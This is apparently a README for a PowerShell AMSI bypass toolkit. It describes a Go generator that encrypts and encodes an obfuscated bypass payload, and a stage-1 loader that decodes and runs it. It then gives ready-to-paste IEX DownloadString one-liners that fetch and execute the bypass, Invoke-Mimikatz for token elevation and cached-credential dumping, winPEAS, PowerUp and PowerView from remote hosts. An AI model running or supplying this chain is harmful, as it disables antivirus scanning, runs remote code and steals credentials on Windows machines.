# Encrypted/Encoded Obfuscated AMSI Bypass

- generator.go  
This wraps an obfuscated AMSI payload from amsi.fail with encryption and encoding  

- stage-1.ps1  
This decodes and invokes the encrypted, encoded, obfuscated payload

Download and invoke stage-1 payload:  
```powershell  
IEX (New-Object Net.WebClient).DownloadString("https://raw.githubusercontent.com/timsonner/encode-decode-payloads/refs/heads/master/amsi-bypass/stage-1.ps1")
```  

Download and invoke whatever you like after stage-1:  
```powershell  
IEX (New-Object Net.WebClient).DownloadString("https://raw.githubusercontent.com/BC-SECURITY/Empire/master/empire/server/data/module_source/credentials/Invoke-Mimikatz.ps1"); Invoke-Mimikatz -Command '"token::elevate" "lsadump::cached"'

IEX(New-Object Net.WebClient).downloadString("https://raw.githubusercontent.com/carlospolop/PEASS-ng/master/winPEAS/winPEASps1/winPEAS.ps1")

IEX (New-Object Net.WebClient).DownloadString("https://raw.githubusercontent.com/PowerShellEmpire/PowerTools/master/PowerUp/PowerUp.ps1");Invoke-AllChecks

IEX (New-Object Net.WebClient).DownloadString("https://raw.githubusercontent.com/PowerShellEmpire/PowerTools/master/PowerView/powerview.ps1")

```  

More IEX and pentestery...  
https://gist.github.com/shorefall/cb9733f3aaf666d7db94e69dcd8b1e44  
https://gist.github.com/mehmethafif/03305b668be52ecaff270bac1700662f  



